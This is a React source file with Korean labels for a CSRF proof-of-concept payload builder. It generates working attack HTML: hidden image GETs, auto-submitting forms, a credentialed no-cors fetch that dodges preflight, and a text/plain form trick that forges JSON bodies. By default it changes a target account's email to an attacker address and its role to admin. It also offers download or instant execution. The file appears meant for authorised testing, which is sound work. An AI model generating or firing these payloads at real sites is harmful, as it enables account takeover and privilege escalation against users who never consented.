import { useState } from 'react'
import { Download, ExternalLink } from 'lucide-react'
import { DISCLAIMER, Note, Pick, TextInput, Readout } from './shared'

const METHODS = [
  { id: 'get', label: 'GET — img 태그 (가장 단순)' },
  { id: 'post-form', label: 'POST — 자동제출 form (urlencoded)' },
  { id: 'post-multipart', label: 'POST — form (multipart/form-data)' },
  { id: 'post-json-fetch', label: 'POST — fetch JSON (no-cors, 세션 자동첨부)' },
  { id: 'post-json-textplain', label: 'POST — form enctype=text/plain (JSON 위조)' },
]

function parsePairs(text: string): [string, string][] {
  return text.split('\n').map(l => l.trim()).filter(Boolean).map(l => {
    const i = l.indexOf('=')
    return i === -1 ? [l, ''] as [string, string] : [l.slice(0, i).trim(), l.slice(i + 1).trim()] as [string, string]
  })
}

const esc = (s: string) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')

export function CsrfPayloadBuilder() {
  const [methodId, setMethodId] = useState('post-form')
  const [action, setAction] = useState('https://TARGET/api/account/email')
  const [pairs, setPairs] = useState('email=attacker@evil.tld\nrole=admin')
  const [json, setJson] = useState('{"email":"attacker@evil.tld","role":"admin"}')
  const [autosubmit, setAutosubmit] = useState('yes')

  const kv = parsePairs(pairs)
  const auto = autosubmit === 'yes'

  let poc: string
  if (methodId === 'get') {
    const qs = kv.map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')
    poc = `<!-- GET CSRF: 이미지 로드만으로 요청 전송 -->
<img src="${esc(action + (action.includes('?') ? '&' : '?') + qs)}" style="display:none" alt="">`
  } else if (methodId === 'post-form' || methodId === 'post-multipart') {
    const enc = methodId === 'post-multipart' ? 'multipart/form-data' : 'application/x-www-form-urlencoded'
    poc = `<!doctype html>
<html>
<body>
  <form id="csrf" action="${esc(action)}" method="POST" enctype="${enc}">
${kv.map(([k, v]) => `    <input type="hidden" name="${esc(k)}" value="${esc(v)}">`).join('\n')}
  </form>
${auto ? '  <script>document.getElementById("csrf").submit()</script>' : '  <button onclick="csrf.submit()">click</button>'}
</body>
</html>`
  } else if (methodId === 'post-json-fetch') {
    poc = `<!doctype html>
<html>
<body>
<script>
// no-cors: 응답은 못 읽지만 쿠키는 붙어서 전송됨. 서버가 CSRF 토큰 없이 JSON 을 받으면 성립.
fetch(${JSON.stringify(action)}, {
  method: 'POST',
  credentials: 'include',
  mode: 'no-cors',
  headers: { 'Content-Type': 'text/plain' },   // simple request 유지 (프리플라이트 회피)
  body: ${JSON.stringify(json)}
});
</script>
</body>
</html>`
  } else {
    // text/plain 트릭: form 이 body 를 "name=value" 로 직렬화하는 성질을 이용해 JSON 을 만든다
    const idx = json.lastIndexOf(':')
    const namePart = idx > -1 ? json.slice(0, idx + 1) : json + '='
    const valuePart = idx > -1 ? json.slice(idx + 1) : ''
    poc = `<!doctype html>
<html>
<body>
  <!-- form 은 body 를 "<name>=<value>" 로 만든다. name/value 를 쪼개 JSON 을 재조립 -->
  <form action="${esc(action)}" method="POST" enctype="text/plain">
    <input name=${JSON.stringify(namePart)} value=${JSON.stringify(valuePart)}>
  </form>
${auto ? '  <script>document.forms[0].submit()</script>' : '  <button onclick="document.forms[0].submit()">click</button>'}
</body>
</html>`
  }

  const notes: string[] = []
  if (methodId.startsWith('post-json')) notes.push('SameSite=Lax/Strict 쿠키면 크로스사이트 POST 에 세션이 안 붙습니다. 대상 쿠키가 SameSite=None; Secure 이거나 미설정(구형 브라우저)일 때 유효.')
  if (methodId === 'post-json-textplain') notes.push('서버가 Content-Type 을 엄격히 검사하지 않고 body 를 JSON 으로 파싱할 때만 성립합니다.')
  if (methodId === 'get') notes.push('상태 변경이 GET 으로 가능한 경우에만. REST 규약을 지키는 API 에는 보통 안 통합니다.')
  notes.push('CSRF 토큰·Origin/Referer 검증·SameSite 쿠키 중 하나라도 제대로 있으면 차단됩니다.')

  return <div className="payload-builder">
    <Note>{DISCLAIMER}</Note>

    <Pick label="요청 방식" value={methodId} onChange={setMethodId} options={METHODS.map(m => ({ id: m.id, label: m.label }))}/>
    <TextInput label="대상 URL (action)" value={action} onChange={setAction} placeholder="https://target/api/..."/>
    {(methodId === 'get' || methodId === 'post-form' || methodId === 'post-multipart')
      ? <><label className="payload-builder-label">파라미터 (한 줄에 key=value)</label>
          <textarea className="payload-builder-textarea" value={pairs} onChange={e => setPairs(e.target.value)} rows={4}/></>
      : <><label className="payload-builder-label">JSON 본문</label>
          <textarea className="payload-builder-textarea" value={json} onChange={e => setJson(e.target.value)} rows={3}/></>}
    {methodId !== 'get' && methodId !== 'post-json-fetch' &&
      <Pick label="자동 제출" value={autosubmit} onChange={setAutosubmit} options={[{ id: 'yes', label: '예 (페이지 열면 즉시)' }, { id: 'no', label: '아니오 (버튼 클릭 유도)' }]}/>}

    {notes.map((t, i) => <p className="payload-builder-hint" key={i}>{t}</p>)}

    <div className="payload-readout-group">
      <Readout title="CSRF PoC" value={poc} wrap="anywhere"/>
      <div className="csrf-poc-actions">
        <button className="secondary-button csrf-action-btn" onClick={() => {
          const blob = new Blob([poc], { type: 'text/html' })
          const url = URL.createObjectURL(blob)
          const a = document.createElement('a')
          a.href = url; a.download = 'csrf-poc.html'
          a.click()
          URL.revokeObjectURL(url)
        }}><Download size={14}/>다운로드 (.html)</button>
        <button className="secondary-button csrf-action-btn" onClick={() => {
          const blob = new Blob([poc], { type: 'text/html' })
          const url = URL.createObjectURL(blob)
          window.open(url, '_blank')
          setTimeout(() => URL.revokeObjectURL(url), 60_000)
        }}><ExternalLink size={14}/>새 탭에서 바로 실행(현재 세션)</button>
      </div>
      <p className="payload-builder-hint">
        다운로드한 파일을 <b>두 번째 테스트 계정</b>으로 로그인한 별도 브라우저(시크릿창/다른 프로필)에 옮겨 열면
        그 계정의 세션으로 요청이 나갑니다 — 이게 실제 CSRF 검증 방법입니다("피해자" = 내가 통제하는 다른 계정).
        "새 탭에서 바로 실행"은 지금 로그인된 이 브라우저 세션으로 즉시 확인하는 용도입니다. 어느 쪽도 서버에
        저장되거나 외부에 공개되는 URL을 만들지 않습니다.
      </p>
    </div>
  </div>
}
